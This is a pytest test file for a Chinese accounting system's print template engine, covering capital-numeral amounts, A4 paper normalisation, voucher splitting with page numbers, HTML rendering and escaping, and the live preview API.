"""打印模板引擎：模板归一化、纸型、金额大写、HTML 渲染。"""
import re
from decimal import Decimal

import pytest

from app.printing.template import (
    DEFAULT_TEMPLATES,
    cn_date,
    PAPERS,
    SCOPES,
    merge_defaults,
    render_table_page,
    render_voucher_page,
    render_voucher_sheet,
    split_voucher,
    to_cn_capital,
    validate_template,
    voucher_rows_per_page,
    voucher_slots_per_page,
    wrap_pages,
)


# --------------------------------------------------------------------- 金额大写


@pytest.mark.parametrize(
    "raw,want",
    [
        ("0", "零元整"),
        ("0.05", "零元伍分"),
        ("0.10", "零元壹角整"),
        ("0.50", "零元伍角整"),
        ("0.57", "零元伍角柒分"),
        ("305.00", "叁佰零伍元整"),
        ("1234.56", "壹仟贰佰叁拾肆元伍角陆分"),
        ("100000", "壹拾万元整"),
        ("100001", "壹拾万零壹元整"),
        ("100100", "壹拾万零壹佰元整"),
        ("1000000", "壹佰万元整"),
        ("20000.07", "贰万元零角柒分"),
        ("100000000", "壹亿元整"),
        ("101000000", "壹亿零壹佰万元整"),
        ("3050000.50", "叁佰零伍万元伍角整"),
        ("-1234.56", "负壹仟贰佰叁拾肆元伍角陆分"),
    ],
)
def test_金额大写(raw, want):
    assert to_cn_capital(Decimal(raw)) == want


def test_金额大写非法输入返回空串():
    assert to_cn_capital("不是数字") == ""


# --------------------------------------------------------------------- 模板归一化


def test_每个内置范围都能通过校验():
    for scope in SCOPES:
        tpl = validate_template(scope, {})
        assert tpl["columns"], scope
        assert abs(sum(c["width"] for c in tpl["columns"]) - 100) < 0.01, scope


def test_列宽归一化到100():
    tpl = validate_template("BALANCE", {"columns": [
        {"key": "code", "width": 1},
        {"key": "name", "width": 1},
        {"key": "opening_debit", "width": 2},
    ]})
    widths = [c["width"] for c in tpl["columns"]]
    assert widths == [25.0, 25.0, 50.0]


def test_未知纸型报错并列出可选项():
    with pytest.raises(ValueError) as e:
        validate_template("VOUCHER", {"paper": "泰坦纸"})
    assert "A4" in str(e.value)


def test_横版纸名归一成A4横向():
    """``A4_LANDSCAPE`` 不是另一种纸，是同一张 A4 横着放（宽高都是 210×297）。

    纸型收敛成 A4 时，纸名里的 ``_LANDSCAPE`` 是**方向意图唯一剩下的载体** ——
    不接过来的话，一份横排的资产负债表会被静默转 90°：元素坐标一个字节没改，
    印出来全错位，而且不报任何错。所以显式写的 ``portrait`` 在这里也扳不回来。
    """
    tpl = validate_template("VOUCHER", {"paper": "A4_LANDSCAPE", "orientation": "portrait"})
    assert tpl["paper"] == "A4"
    assert tpl["orientation"] == "landscape"


def test_非横版纸名归一成A4纵向():
    """A5/B5 没有 ``_LANDSCAPE`` 后缀，方向由模板自己存的值说了算。"""
    assert validate_template("VOUCHER", {"paper": "A5"})["orientation"] == "portrait"
    assert validate_template("VOUCHER", {"paper": "A5", "orientation": "landscape"})[
        "orientation"] == "landscape"


def test_纸型一律归一成A4():
    """全局只剩 A4：任何纸型进来存出去都是 A4，界面上也就没有第二个选项。"""
    for paper in ("A4", "A5", "B5", "A3", "CONTINUOUS", "A4_LANDSCAPE"):
        assert validate_template("VOUCHER", {"paper": paper})["paper"] == "A4", paper


def test_非法方向被纠正为纵向():
    assert validate_template("VOUCHER", {"orientation": "diagonal"})["orientation"] == "portrait"


def test_非法对齐被纠正为左对齐():
    tpl = validate_template("VOUCHER", {"columns": [{"key": "a", "align": "居中"}]})
    assert tpl["columns"][0]["align"] == "left"


def test_没有列时报错():
    with pytest.raises(ValueError):
        validate_template("VOUCHER", {"columns": []})


def test_列缺少key时报错():
    with pytest.raises(ValueError) as e:
        validate_template("VOUCHER", {"columns": [{"label": "没写字段名"}]})
    assert "key" in str(e.value)


def test_负页边距被夹到0():
    tpl = validate_template("VOUCHER", {"margins": {"top": -5, "left": -1}})
    assert tpl["margins"]["top"] == 0.0
    assert tpl["margins"]["left"] == 0.0


def test_未知范围报错():
    with pytest.raises(ValueError):
        validate_template("PAYROLL", {})


# --------------------------------------------------------------------- 向前兼容


def test_新增配置项不影响老模板():
    """老模板里没有新字段时，靠默认值补齐 —— 这是「框架不妨碍迭代」的关键。"""
    old = {"title": {"text": "老模板"}}          # 模拟只存了标题的老数据
    tpl = validate_template("VOUCHER", old)
    assert tpl["title"]["text"] == "老模板"
    assert tpl["font"]["family"]                 # 老模板没存字体，靠默认值
    assert tpl["margins"]["top"] == 10.0
    assert tpl["footer"]["show_page_no"] is True


def test_merge_defaults不修改入参():
    src = {"title": {"text": "X"}}
    merge_defaults("VOUCHER", src)
    assert src == {"title": {"text": "X"}}


def test_覆盖值优先于默认值():
    tpl = validate_template("VOUCHER", {"title": {"text": "自定义"}, "font": {"size": 14}})
    assert tpl["title"]["text"] == "自定义"
    assert tpl["title"]["bold"] is True        # 没被覆盖的仍取默认
    assert tpl["font"]["size"] == 14
    assert tpl["font"]["family"] == "宋体"


# --------------------------------------------------------------------- 渲染


def test_凭证页含关键要素():
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_page(tpl, {"company": "紫欣星悦荟", "book": "租金账套"},
                               {"voucher_no": "记0001", "voucher_date": "2026-01-05",
                                "attachments": 2, "remark": "首月租金",
                                "total_debit": "1234.56", "total_credit": "1234.56",
                                "entries": [
                                    {"line_no": 1, "summary": "收租", "subject_code": "1002",
                                     "subject_name": "银行存款", "direction": "DEBIT",
                                     "amount": "1234.56"},
                                ]},
                               1, 1)
    assert "@page" in html
    assert "记0001" in html and "紫欣星悦荟" in html
    assert "壹仟贰佰叁拾肆元伍角陆分" in html   # 金额大写
    assert "首月租金" in html                     # 备注
    assert "附单据" in html                       # 附单据数
    assert "2026年01月05日" in html                # 制单日期按中文写
    assert "凭证字号" in html


def test_分录文本单元格最多两行():
    """摘要再长也只占两行，行高不被撑开。

    凭证是固定版式：一行撑高，整页分录行跟着变高，多页凭证的分页位置跟着错。
    ``overflow:hidden`` 只把多余部分裁掉、**不会**缩回行高，真正限行数的是
    ``-webkit-line-clamp``；而它必须落在 td 里面的 span 上 —— 直接给 td 加
    ``display:-webkit-box`` 会把 td 从列模型里摘出去，列宽跟着塌。
    """
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_page(tpl, {"company": "紫欣星悦荟", "book": "租金账套"},
                               {"voucher_no": "记0001", "voucher_date": "2026-01-05",
                                "total_debit": "1.00", "total_credit": "1.00",
                                "entries": [
                                    {"line_no": 1, "summary": "很长的摘要" * 20,
                                     "subject_path": "银行存款/基本户",
                                     "direction": "DEBIT", "amount": "1.00"},
                                ]},
                               1, 1)
    # 文本列套上 clamp
    assert '<span class="clamp2">' in html
    assert "-webkit-line-clamp:2" in html
    # 金额列是 nowrap 单行，不套 clamp —— 否则「借贷两列并排」那类断言全要跟着改
    assert '<td class="num">1.00</td>' in html


def test_科目列只印层级路径不印编码():
    """科目列印「一级/二级/.../末级」，编码不再跟着上纸。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_page(tpl, {"company": "紫欣星悦荟", "book": "租金账套"},
                               {"voucher_no": "记0001", "voucher_date": "2026-01-05",
                                "total_debit": "1.00", "total_credit": "1.00",
                                "entries": [
                                    {"line_no": 1, "summary": "收租",
                                     "subject_code": "100203", "subject_name": "基本户",
                                     "subject_path": "银行存款/星悦荟基本户",
                                     "direction": "DEBIT", "amount": "1.00"},
                                ]},
                               1, 1)
    assert "银行存款/星悦荟基本户" in html
    assert "100203" not in html


def test_科目列没有路径时退回科目名而不是空():
    """老数据没有 subject_path，退回名字而不是退回到「编码 名称」。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_page(tpl, {"company": "紫欣星悦荟", "book": "租金账套"},
                               {"voucher_no": "记0001", "voucher_date": "2026-01-05",
                                "total_debit": "1.00", "total_credit": "1.00",
                                "entries": [
                                    {"line_no": 1, "summary": "收租",
                                     "subject_code": "100203", "subject_name": "基本户",
                                     "direction": "DEBIT", "amount": "1.00"},
                                ]},
                               1, 1)
    assert "基本户" in html
    assert "100203" not in html


def test_表格页含表头与行():
    tpl = validate_template("BALANCE", {})
    rows = [{"code": "1002", "name": "银行存款", "level": 1,
             "opening_debit": "200000", "period_credit": "97000"}]
    html = render_table_page(tpl, {"company": "X", "period": "2026-12"}, rows, 1, 1)
    assert "科目余额表" in html
    assert "银行存款" in html and "200,000.00" in html
    # 级次是居中列，不能被当成金额格式化成 "1.00"
    assert ">1<" in html and "1.00" not in html


def test_表格页空数据显示占位():
    html = render_table_page(validate_template("BALANCE", {}), {}, [], 1, 1)
    assert "无数据" in html


def test_渲染会转义HTML():
    """科目名里带尖括号时不能破坏 DOM。"""
    tpl = validate_template("BALANCE", {})
    html = render_table_page(tpl, {}, [{"name": "<script>x</script>", "code": "1"}], 1, 1)
    assert "<script>x</script>" not in html
    assert "&lt;script&gt;" in html


def test_纸型映射表完整():
    for key in ("A4", "A3", "A5", "B5"):
        assert PAPERS[key]["w"] > 0 and PAPERS[key]["h"] > 0


def test_横版纸型打出来确实是横向():
    """``A4_LANDSCAPE`` 断言的是**渲染结果**而不是表里的宽高 ——
    表里存什么无所谓，用户拿到的是 ``@page`` 里那个尺寸。
    曾经把横向宽高存进 ``PAPERS``，又被 ``orientation`` 换了一遍，
    名字叫横版、实际打出 A4 纵向。"""
    tpl = validate_template("VOUCHER", {"paper": "A4_LANDSCAPE"})
    doc = render_table_page(tpl, {}, [], 1, 1)
    assert _page_size(doc) == "A4 landscape"
    assert "A4 portrait" not in doc


# --------------------------------------------------------------------- 设计器实时预览
#
# 用户诉求是「左边改版式，右边立刻变」。这靠一个接口保证：
# 预览吃的是**还没保存的草稿**，并且和正式打印共用同一个渲染函数。


def test_预览用草稿模板渲染(client, auth, book, periods, make_voucher):
    """改标题后预览应立刻出现新标题，不必先保存。"""
    make_voucher("2026-01-05", dr=[("1001", 300, "首月租金")],
                 cr=[("5001", 300, "首月租金")], posted=True)
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {"title": {"text": "草稿专用抬头"}},
              "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 200, r.text
    assert "草稿专用抬头" in r.text


def test_预览不写库(client, auth, book, periods, make_voucher):
    """预览只渲染不落库 —— 否则调一次版式就凭空多出一个模板。"""
    make_voucher("2026-01-05", dr=[("1001", 300, "x")], cr=[("5001", 300, "x")], posted=True)
    before = len(client.get(f"/api/books/{book.id}/print/templates", headers=auth).json())

    client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {"title": {"text": "只看一眼"}},
              "period_id": periods[1].id},
        headers=auth,
    )

    after = client.get(f"/api/books/{book.id}/print/templates", headers=auth).json()
    assert len(after) == before


def test_预览与正式打印排版一致(client, auth, book, periods, make_voucher):
    """同一份模板内容，预览和打印必须渲染出同样的 HTML。

    这是「所见即所得」的全部含义 —— 两边一旦分叉，预览就失去意义了。
    """
    make_voucher("2026-01-05", dr=[("1001", 300, "首月租金")],
                 cr=[("5001", 300, "首月租金")], posted=True)
    content = {"title": {"text": "记 账 凭 证"}, "font": {"size": 9}}

    prev = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": content, "period_id": periods[1].id},
        headers=auth,
    )
    # 打印接口读的是「该范围的内置默认模板」，这里传同样的默认内容
    tpl_id = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "对照模板", "content": content},
        headers=auth,
    ).json()["id"]
    printed = client.get(
        f"/api/books/{book.id}/print/vouchers.html",
        params={"period_id": periods[1].id, "template_id": tpl_id},
        headers=auth,
    )

    assert prev.status_code == 200 and printed.status_code == 200

    def body(h):
        # 预览页顶部多一行「只显示前 3 张」的说明，那是给人看的，不属于排版
        return h.split("<body>")[1].replace(
            '<p class="page-note">预览只显示前 3 张凭证，打印时输出该期间全部凭证。</p>', ""
        )

    assert body(prev.text) == body(printed.text)


def test_草稿半成品时预览给出可读提示(client, auth, book, periods):
    """把所有列删掉时不该 500 —— 设计器正要允许你这么干。"""
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {"columns": []}, "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 422
    assert "预览" in r.json()["detail"]


def test_预览不传期间时与打印一致地回落到最后一期(client, auth, book, make_voucher):
    """_period() 一直有「不传就取最后一期」的兜底，预览不能自己另立一套规则。"""
    make_voucher("2026-01-05", dr=[("1001", 300, "x")], cr=[("5001", 300, "x")], posted=True)
    r = client.post(f"/api/books/{book.id}/print/preview",
                    json={"scope": "BALANCE", "content": {}}, headers=auth)
    assert r.status_code == 200, r.text
    assert "2026-12" in r.text


def test_预览凭证只取前三张(client, auth, book, periods, make_voucher):
    """预览限定张数，否则一个大期间的凭证能把改版式卡死。"""
    for i in range(1, 7):
        make_voucher(f"2026-01-0{i}", dr=[("1001", 100 + i, f"第{i}笔")],
                     cr=[("5001", 100 + i, f"第{i}笔")], posted=True)
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {}, "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 200
    assert r.text.count('class="grid"') == 3
    assert "预览只显示前 3 张" in r.text


def test_只读账套也能预览(client, auth, db, book, periods, plain_user):
    """预览是只读动作，只读账套必须能用（保存模板才需要写权限）。"""
    from app.models import UserBook

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="VIEWER"))
    db.commit()
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "BALANCE", "content": {}, "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 200, r.text


# --------------------------------------------------------------------- 凭证分片
#
# 会计凭证的物理规则：一张最多 5 行摘要，超出的行续到下一张凭证打印，
# 凭证号带分页号（记001 - 001/006），这样撕开的两张仍然对得上同一张凭证。


def _entries(n: int) -> list[dict]:
    return [
        {"line_no": i, "summary": f"摘要{i}", "subject_code": "1002",
         "subject_name": "银行存款", "direction": "DEBIT" if i % 2 else "CREDIT",
         "amount": "10"}
        for i in range(1, n + 1)
    ]


def _voucher(no: str = "记001", n: int = 3, **kw) -> dict:
    return {"voucher_no": no, "voucher_date": "2026-01-05", "attachments": 1,
            "remark": "首月租金", "entries": _entries(n), **kw}


def test_五行以内不拆但仍带分页号():
    """不拆的是 001/001 —— 和拆过的那几张长得一样，撕开/没撕开一眼能认出来。"""
    pieces = split_voucher(_voucher(n=5), 5)
    assert len(pieces) == 1
    assert pieces[0]["voucher_no"] == "记001 - 001/001"
    # 账上的凭证号一个字都没动，分页号只是打印时加的
    assert pieces[0]["entries"] == _entries(5)


def test_日期按中文打印():
    """凭证上的日期是「2026年01月05日」，不是 ISO 的 2026-01-05。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_page(tpl, {}, _voucher(), 1, 1)
    assert "2026年01月05日" in html
    assert "2026-01-05" not in html


def test_非ISO日期原样输出():
    assert cn_date("") == ""
    assert cn_date("不是日期") == "不是日期"


def test_超五行拆成多张并加分页号():
    """分页号写成 记001 - 001/006：既是凭证号，又看得出是第几张、共几张。"""
    pieces = split_voucher(_voucher(n=12), 5)
    assert [p["voucher_no"] for p in pieces] == [
        "记001 - 001/003", "记001 - 002/003", "记001 - 003/003"]
    assert [len(p["entries"]) for p in pieces] == [5, 5, 2]


def test_分页编号格式可配():
    """模板可以换写法，也能换成「起始行/总行数」。"""
    pieces = split_voucher(_voucher(n=29), 5, "{voucher_no} - {first}/{lines}")
    assert pieces[0]["voucher_no"] == "记001 - 001/029"
    assert pieces[1]["voucher_no"] == "记001 - 006/029"
    assert pieces[-1]["voucher_no"] == "记001 - 026/029"


def test_分页编号按模板走():
    tpl = validate_template("VOUCHER", {"voucher": {"split_format": "{voucher_no}（续{page}）"}})
    fmt = tpl["voucher"]["split_format"]
    assert split_voucher(_voucher(n=12), 5, fmt)[1]["voucher_no"] == "记001（续002）"


def test_分页编号空串退回默认写法():
    """输入框被清空不能变成「不加分页号」—— 没拆过的凭证本来就该是记001。"""
    tpl = validate_template("VOUCHER", {"voucher": {"split_format": "   "}})
    pieces = split_voucher(_voucher(n=12), 5, tpl["voucher"]["split_format"])
    assert pieces[0]["voucher_no"] == "记001 - 001/003"


def test_分片合计逐页累计():
    """拆页是排版，不是把一张凭证的账算成好几张：
    第二张印前两张加起来的数，最后一张等于整张凭证的合计。"""
    pieces = split_voucher(_voucher(n=12), 5)
    assert pieces[0]["total_debit"] == "30"      # 第 1、3、5 行
    assert pieces[1]["total_debit"] == "50"      # 加上第 7、9 行
    assert pieces[2]["total_debit"] == "60"      # 加上第 11 行 = 整张凭证
    assert pieces[0]["total_credit"] == "20"
    assert pieces[-1]["total_credit"] == "60"


def test_最后一页合计等于整张凭证():
    """最后一页必须能和账上的原凭证对上，不然撕开就没法核。"""
    whole = _voucher(n=29)
    pieces = split_voucher(whole, 5)
    dr = sum(float(e["amount"]) for e in whole["entries"] if e["direction"] == "DEBIT")
    assert float(pieces[-1]["total_debit"]) == dr


def test_累计合计的金额大写跟着走():
    """把「仅在尾页显示」关掉后，合计大写取的是这张分片的累计数。"""
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "cap", "type": "text", "bind": "capital",
         "text": "合计大写：{capital}", "x": 3, "y": 82, "w": 64, "h": 5,
         "last_page_only": False},
    ]})
    pieces = split_voucher(_voucher(n=12), 5)
    html = render_voucher_sheet(tpl, {}, pieces, 1, 1)
    assert "陆拾元整" in html      # 最后一张 = 整张凭证的合计
    assert "叁拾元整" in html      # 第一张 = 前 5 行的累计


def test_合计大写默认只在尾页显示():
    """拆页后只有最后一张是完整的凭证。

    每张都印一个累计合计，看起来会像每张都是整张凭证的合计 —— 默认只在尾页印。
    """
    tpl = validate_template("VOUCHER", {})
    pieces = split_voucher(_voucher(n=12), 5)
    pages = [render_voucher_sheet(tpl, {}, [p], 1, 1) for p in pieces]
    assert [html.count("合计大写") for html in pages] == [0, 0, 1]
    assert "陆拾元整" in pages[-1]        # 尾页印的是整张凭证的大写
    assert "叁拾元整" not in pages[0]     # 续页上的分片合计不印


def test_没拆过的凭证照常印合计大写():
    """不拆页时整张凭证就是尾页，不能因为默认开关而把合计藏掉。"""
    html = render_voucher_page(validate_template("VOUCHER", {}), {}, _voucher(n=3), 1, 1)
    assert "合计大写" in html


def test_只有合计大写默认仅尾页():
    """凭证字号带着分页号，续页上不能没有，所以只有合计大写默认关到尾页。"""
    tpl = validate_template("VOUCHER", {})
    flags = {el["bind"]: el["last_page_only"]
             for el in tpl["elements"] if el["type"] == "text"}
    assert flags["capital"] is True
    assert flags["voucher_no"] is False
    assert flags["remark"] is False


def test_仅尾页开关不影响表格():
    """表格每页都要有，拆页只是把分录摊开，续页上没有表头表尾就没法核。"""
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "t", "type": "table", "bind": "entries", "x": 3, "y": 23,
         "w": 94, "h": 57, "last_page_only": True},
    ]})
    pieces = split_voucher(_voucher(n=12), 5)
    htmls = [render_voucher_sheet(tpl, {}, [p], 1, 1) for p in pieces]
    assert all("class=\"grid\"" in html for html in htmls)


def test_分片保留原始行号():
    """续页的第 6 行仍然印「6」，不能从 1 重新数 —— 对账时按行号核。"""
    assert split_voucher(_voucher(n=12), 5)[1]["entries"][0]["line_no"] == 6


def test_分片行数可调但上限五行():
    tpl = validate_template("VOUCHER", {"voucher": {"rows_per_page": 99}})
    assert voucher_rows_per_page(tpl) == 5
    assert len(split_voucher(_voucher(n=12), voucher_rows_per_page(tpl))) == 3


# --------------------------------------------------------------------- 模板改名


def test_模板可以改名且不动版式(client, auth, book):
    """界面上「重命名」走的就是这个 PUT：只换名字，内容一个字都不许变。"""
    created = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "改名前", "content": {"paper": "A5"}},
        headers=auth,
    ).json()
    before = client.get(f"/api/books/{book.id}/print/templates/{created['id']}",
                        headers=auth).json()["content"]

    r = client.put(f"/api/books/{book.id}/print/templates/{created['id']}",
                   json={"name": "改名后"}, headers=auth)
    assert r.status_code == 200, r.text
    after = client.get(f"/api/books/{book.id}/print/templates/{created['id']}",
                       headers=auth).json()
    assert after["name"] == "改名后"
    assert after["content"] == before
    names = [t["name"] for t in client.get(f"/api/books/{book.id}/print/templates",
                                           headers=auth).json()]
    assert "改名后" in names


def test_改名不影响已保存的版式内容(client, auth, book):
    """改名不是「重新保存」：content 没传就不能动它。

    这里特意用「一张纸装一张凭证」的老模板（A5）当例子，因为它的 ``paper``
    会被归一成 A4、意图搬进 ``voucher.slots_per_page``。改名之后这个 1 必须
    还在 —— 悄悄变回 2 就是「用户没改任何东西，印出来的张数变了」，
    正是这次改纸型最容易踩的坑。
    """
    created = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "A5 版", "content": {"paper": "A5"}},
        headers=auth,
    ).json()
    assert created["content"]["paper"] == "A4"
    assert created["content"]["voucher"]["slots_per_page"] == 1

    client.put(f"/api/books/{book.id}/print/templates/{created['id']}",
               json={"name": "A5 版（终版）"}, headers=auth)
    again = client.get(f"/api/books/{book.id}/print/templates/{created['id']}",
                       headers=auth).json()
    assert again["content"]["paper"] == "A4"
    assert again["content"]["voucher"]["slots_per_page"] == 1


# --------------------------------------------------------------------- 每页几张


def test_A4一页两张():
    assert voucher_slots_per_page(validate_template("VOUCHER", {})) == 2


def test_每页一张由模板自己说了算():
    """「一页几张」不再从纸型推 —— 纸型恒为 A4，推出来永远是 2。

    A4 一页一张是老 A5 模板的意图，归一化时搬进了 ``slots_per_page``；
    用户也能在设计器里把 A4 改成一张。
    """
    tpl = validate_template("VOUCHER", {"paper": "A5"})
    assert tpl["paper"] == "A4"
    assert tpl["voucher"]["slots_per_page"] == 1
    assert voucher_slots_per_page(tpl) == 1
    html = render_voucher_sheet(tpl, {}, [_voucher(), _voucher()], 1, 1)
    assert "slots-1" in html

    explicit = validate_template("VOUCHER", {"voucher": {"slots_per_page": 1}})
    assert explicit["paper"] == "A4"
    assert voucher_slots_per_page(explicit) == 1


def _sheet_grid_css(doc: str) -> str:
    """从渲染结果里取出决定槽位尺寸的那几条 CSS。"""
    style = re.search(r"<style>([\s\S]*?)</style>", doc).group(1)
    return "\n".join(line.strip() for line in style.splitlines()
                      if ".voucher-sheet" in line)


def _slots_never_in_selector(doc: str) -> None:
    """**放几张不许出现在选择器里。**

    这是本条不变量的要害，而且只比「两份 CSS 是否相同」是不够的：把
    ``.voucher-sheet.slots-1 { … 整页高 }`` 写回去时，那条规则会**同时**出现在
    一张和两份的文档里，两份 CSS 仍然逐字相同，测试照样绿 —— 而浏览器正按
    更具体的那条把凭证抻开。必须直接断言「张数不出现在选择器上」。
    """
    style = re.search(r"<style>([\s\S]*?)</style>", doc).group(1)
    bad = [ln.strip() for ln in style.splitlines()
           if re.search(r"voucher-sheet[^\n]*\.slots-\d", ln)]
    assert not bad, "槽位尺寸跟着张数变了：\n" + "\n".join(bad)


def test_每页一张不把凭证抻开():
    """「每页一张」= 两张里去掉一张，**不是**把剩下那张拉到整页高。

    元素坐标是槽位内的百分比，所以槽位一变大，标题、表格、页脚会一起被纵向
    抻开 —— 而用户一个坐标都没改过，看着就是「模板严重变形」。
    判定方式是**两张与一张的槽位 CSS 必须逐字相同**：轨道数只由纸的横竖决定，
    与放几张无关；少放的那一格留空。
    """
    two = render_voucher_sheet(validate_template("VOUCHER", {"voucher": {"slots_per_page": 2}}),
                               {}, [_voucher()], 1, 1)
    one = render_voucher_sheet(validate_template("VOUCHER", {"voucher": {"slots_per_page": 1}}),
                               {}, [_voucher()], 1, 1)
    assert "slots-2" in two and "slots-1" in one
    _slots_never_in_selector(one)
    _slots_never_in_selector(two)
    assert _sheet_grid_css(two) == _sheet_grid_css(one), \
        "一张时槽位尺寸变了，凭证会被纵向抻开"


def test_横竖决定槽位排列而不是放几张():
    """横向横排、纵向竖排；但两种排列都与放几张无关。"""
    land2 = render_voucher_sheet(validate_template("VOUCHER", {"orientation": "landscape",
                                                              "voucher": {"slots_per_page": 2}}),
                                 {}, [_voucher()], 1, 1)
    land1 = render_voucher_sheet(validate_template("VOUCHER", {"orientation": "landscape",
                                                              "voucher": {"slots_per_page": 1}}),
                                 {}, [_voucher()], 1, 1)
    assert "flow-columns" in land2 and "flow-columns" in land1
    _slots_never_in_selector(land1)
    _slots_never_in_selector(land2)
    assert _sheet_grid_css(land2) == _sheet_grid_css(land1)
    assert _sheet_grid_css(land2) != _sheet_grid_css(two_portrait := render_voucher_sheet(
        validate_template("VOUCHER", {}), {}, [_voucher()], 1, 1)), "横竖应该排出不同的格子"


def test_槽位格子恒为两份_一张时下半截留空():
    """纵向两格、横向两格 —— 一张时只是第二个格子不放东西。"""
    portrait = render_voucher_sheet(validate_template("VOUCHER", {"voucher": {"slots_per_page": 1}}),
                                    {}, [_voucher()], 1, 1)
    _slots_never_in_selector(portrait)
    assert "grid-template-rows:repeat(2,minmax(0,1fr))" in portrait
    land = render_voucher_sheet(validate_template("VOUCHER", {"orientation": "landscape"}),
                                {}, [_voucher()], 1, 1)
    assert "grid-template-columns:repeat(2,minmax(0,1fr))" in land


def test_每页张数只认slots_per_page_不认纸型():
    """显式给的 slots_per_page 优先于从纸型推出来的旧值。"""
    tpl = validate_template("VOUCHER", {"paper": "A5",
                                        "voucher": {"slots_per_page": 2}})
    assert voucher_slots_per_page(tpl) == 2
    assert "slots-2" in render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)


def test_A4纵向上下排横向左右排():
    tpl = validate_template("VOUCHER", {})
    assert "slots-2 flow-rows" in render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    land = validate_template("VOUCHER", {"orientation": "landscape"})
    assert "slots-2 flow-columns" in render_voucher_sheet(land, {}, [_voucher()], 1, 1)


def test_一张纸上放两张凭证():
    html = render_voucher_sheet(validate_template("VOUCHER", {}), {},
                                [_voucher("记001"), _voucher("记002")], 1, 1)
    assert html.count('class="voucher-slot"') == 2
    assert html.count('class="grid"') == 2
    assert "记002" in html


def test_元素按槽位百分比定位():
    """元素坐标是「当前槽位」的百分比，所以模板不用为 A4/A5 各存一份。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "left:3.0%;top:23.0%" in html or "left:3%;top:23%" in html


def test_隐藏元素不输出():
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "a", "type": "text", "bind": "remark", "text": "备注：{remark}", "visible": False},
        {"id": "b", "type": "text", "bind": "voucher_no", "text": "号：{voucher_no}"},
    ]})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "首月租金" not in html
    assert "号：记001" in html


def test_开关关掉后元素不输出():
    """旧模板的 meta/show 开关在元素化之后仍然有效，不能让它们失效。"""
    tpl = validate_template("VOUCHER", {"meta": {"attachments": False}})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "附单据" not in html


# --------------------------------------------------------------------- 端到端


def test_十二行凭证打印时占满三张A4(client, auth, book, periods, make_voucher):
    """12 行 → 3 个槽位；A4 一页 2 张，所以是 2 张纸。"""
    make_voucher("2026-01-05",
                 dr=[("1001", 10, f"借{i}") for i in range(6)],
                 cr=[("5001", 10, f"贷{i}") for i in range(6)], posted=True)
    # ``template_id=0`` = 明确选内置版式，不吃账套默认模板。
    # 这一组用例验的是**引擎**的分页/每页张数规则，而「不指定模板时默认用哪张」
    # 已经不是同一件事了：迁移 0022 起 VOUCHER 范围有一对基线模板，默认那份是 A5 的
    # 「凭证纸专用」。不钉死模板来源的话，改动基线就会把这组引擎用例一起推翻 ——
    # 而它们跟基线版式无关。
    r = client.get(f"/api/books/{book.id}/print/vouchers.html",
                   params={"period_id": periods[1].id, "template_id": 0}, headers=auth)
    assert r.status_code == 200, r.text
    assert "记0001 - 001/003" in r.text and "记0001 - 002/003" in r.text
    assert "记0001 - 003/003" in r.text
    assert r.text.count('class="voucher-slot"') == 3      # 3 个槽位
    assert r.text.count('<div class="page">') == 2         # A4 两槽位 → 2 张纸


def test_拆页凭证整批只印一次合计大写(client, auth, book, periods, make_voucher):
    """12 行 → 3 个分片，A4 一页 2 张；合计大写只在尾页那一张上出现。"""
    make_voucher("2026-01-05",
                 dr=[("1001", 10, f"借{i}") for i in range(6)],
                 cr=[("5001", 10, f"贷{i}") for i in range(6)], posted=True)
    # ``template_id=0`` = 明确选内置版式，不吃账套默认模板。
    # 这一组用例验的是**引擎**的分页/每页张数规则，而「不指定模板时默认用哪张」
    # 已经不是同一件事了：迁移 0022 起 VOUCHER 范围有一对基线模板，默认那份是 A5 的
    # 「凭证纸专用」。不钉死模板来源的话，改动基线就会把这组引擎用例一起推翻 ——
    # 而它们跟基线版式无关。
    r = client.get(f"/api/books/{book.id}/print/vouchers.html",
                   params={"period_id": periods[1].id, "template_id": 0}, headers=auth)
    assert r.status_code == 200, r.text
    assert r.text.count("合计大写") == 1
    assert "陆拾元整" in r.text          # 尾页印的是整张凭证的合计


def test_A5打印时每页一张(client, auth, book, periods, make_voucher):
    make_voucher("2026-01-05", dr=[("1001", 10, "x")], cr=[("5001", 10, "x")],
                 posted=True)
    make_voucher("2026-01-06", dr=[("1001", 20, "y")], cr=[("5001", 20, "y")],
                 posted=True)
    tpl_id = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "A5", "content": {"paper": "A5"}},
        headers=auth,
    ).json()["id"]
    r = client.get(f"/api/books/{book.id}/print/vouchers.html",
                   params={"period_id": periods[1].id, "template_id": tpl_id}, headers=auth)
    assert r.status_code == 200, r.text
    assert r.text.count('<div class="page">') == 2     # 一页一张 → 2 张纸


def test_预览的分片与正式打印一致(client, auth, book, periods, make_voucher):
    """拆页最容易在预览里跑偏：同一份内容，两边必须拆成一样的槽位。"""
